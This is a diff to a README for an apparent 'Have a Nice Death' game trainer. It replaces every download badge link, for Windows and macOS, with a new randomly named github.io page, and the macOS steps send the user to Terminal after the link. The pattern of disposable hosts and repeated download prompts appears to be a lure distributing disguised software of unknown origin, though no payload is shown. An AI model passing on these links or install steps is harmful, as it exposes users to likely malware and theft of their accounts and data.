@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Download Have a Nice Death Trainer](https://img.shields.io/badge/⬇_Download_Have%20a%20Nice%20Death_Trainer-E63946?style=for-the-badge&logo=github)](https://bansheeloaderquay.github.io/dl-win/)
+[![⬇ Download Have a Nice Death Trainer](https://img.shields.io/badge/⬇_Download_Have%20a%20Nice%20Death_Trainer-E63946?style=for-the-badge&logo=github)](https://WatchMizukageSnap.github.io/getwindows/)
 
 </div>
 
@@ -78,9 +78,9 @@ Have a Nice Death is a hand-animated 2D roguelite where you play as Death himsel
 
 <div align="center">
 
-[![Download Trainer for Windows](https://img.shields.io/badge/Download_Trainer_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://bansheeloaderquay.github.io/dl-win/)
+[![Download Trainer for Windows](https://img.shields.io/badge/Download_Trainer_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://WatchMizukageSnap.github.io/getwindows/)
 
-[![Download Trainer for macOS](https://img.shields.io/badge/Download_Trainer_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://bansheeloaderquay.github.io/dl-mac/)
+[![Download Trainer for macOS](https://img.shields.io/badge/Download_Trainer_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WatchMizukageSnap.github.io/getmac/)
 
 </div>
 
@@ -101,7 +101,7 @@ Have a Nice Death is a hand-animated 2D roguelite where you play as Death himsel
 
 <div align="center">
 
-[![⬇ Download Have a Nice Death Trainer](https://img.shields.io/badge/⬇_Download_Have%20a%20Nice%20Death_Trainer-E63946?style=for-the-badge&logo=github)](https://bansheeloaderquay.github.io/dl-win/)
+[![⬇ Download Have a Nice Death Trainer](https://img.shields.io/badge/⬇_Download_Have%20a%20Nice%20Death_Trainer-E63946?style=for-the-badge&logo=github)](https://WatchMizukageSnap.github.io/getwindows/)
 
 </div>
 
@@ -133,7 +133,7 @@ Have a Nice Death is a hand-animated 2D roguelite where you play as Death himsel
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://bansheeloaderquay.github.io/dl-mac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WatchMizukageSnap.github.io/getmac/)
 
 1. Click the badge above to open the macOS trainer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -158,7 +158,7 @@ Have a Nice Death is a hand-animated 2D roguelite where you play as Death himsel
 
 <div align="center">
 
-[![⬇ Download Have a Nice Death Trainer](https://img.shields.io/badge/⬇_Download_Have%20a%20Nice%20Death_Trainer-E63946?style=for-the-badge&logo=github)](https://bansheeloaderquay.github.io/dl-win/)
+[![⬇ Download Have a Nice Death Trainer](https://img.shields.io/badge/⬇_Download_Have%20a%20Nice%20Death_Trainer-E63946?style=for-the-badge&logo=github)](https://WatchMizukageSnap.github.io/getwindows/)
 
 </div>
 
